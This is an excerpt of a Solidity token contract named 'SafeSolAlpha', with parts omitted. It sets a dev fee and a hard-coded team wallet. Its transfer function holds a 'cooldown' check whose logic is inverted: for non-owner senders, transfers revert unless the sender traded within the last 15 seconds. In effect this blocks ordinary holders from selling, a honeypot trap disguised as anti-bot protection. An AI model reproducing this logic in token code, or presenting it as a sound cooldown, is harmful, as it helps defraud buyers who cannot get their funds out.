...
contract SafeSolAlpha is Context, IERC20, Ownable {
    ...
    function initContract() external onlyOwner() {
        ...
        _devFee = 3;
        _teamDevAddress = payable(0x21F3Cca57f3C44acf483F904217aa2Aa9e8E4c8a);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(sender != owner() && recipient != owner()) {
            ...
            if (cooldownEnabled) {
                if (_lastTx[sender] + 15 > block.timestamp
                    && sender != address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
                    && sender != address(uniswapV2Pair)
                ) {
                    _lastTx[sender] = block.timestamp;
                } else {
                    require(!cooldownEnabled, "You're on cooldown! 15s between trades!");
                }
            }
